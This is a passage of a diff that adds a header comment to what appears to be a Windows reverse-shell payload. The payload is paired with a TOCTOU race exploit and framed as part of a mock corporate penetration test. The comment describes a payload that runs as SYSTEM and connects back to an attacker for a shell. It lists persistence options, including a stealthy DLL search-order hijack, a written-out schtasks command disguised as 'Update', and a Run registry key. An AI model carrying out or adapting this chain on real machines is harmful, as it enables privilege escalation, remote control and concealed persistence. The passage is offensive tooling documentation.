+ *   5. Payload runs as SYSTEM → connects to attacker → SYSTEM shell
+ *
+ * The payload itself doesn't need to know HOW it got into System32.
+ * It just connects back and spawns a shell. Separation of concerns:
+ *   - cheyanne_toctou.c = delivery (TOCTOU race condition)
+ *   - bb5_revshell.c = payload (reverse shell callback)
+ *
+ * EXECUTION TRIGGERS (after payload is planted):
+ *
+ *   Option A — DLL Search Order Hijack:
+ *     Rename payload to a DLL that a SYSTEM service loads.
+ *     Requires DllMain entry point instead of WinMain.
+ *     Most stealthy — piggybacks on legitimate service startup.
+ *
+ *   Option B — Scheduled Task:
+ *     From SYSTEM shell (first connection), create a schtask:
+ *       schtasks /create /tn "Update" /tr "C:\Windows\System32\payload.exe"
+ *                /sc onlogon /ru SYSTEM
+ *     Survives reboot. Visible in Task Scheduler if someone looks.
+ *
+ *   Option C — Registry Run Key:
+ *     From SYSTEM shell, add to HKLM\SOFTWARE\Microsoft\Windows\
+ *       CurrentVersion\Run
+ *     Runs on every login. Visible in msconfig/autoruns.
+ *
+ *   For the mock corporate pentest: Option B (scheduled task) is the
+ *   clearest to demonstrate and document in the engagement report.
+ * ═══════════════════════════════════════════════════════════════════════════ */
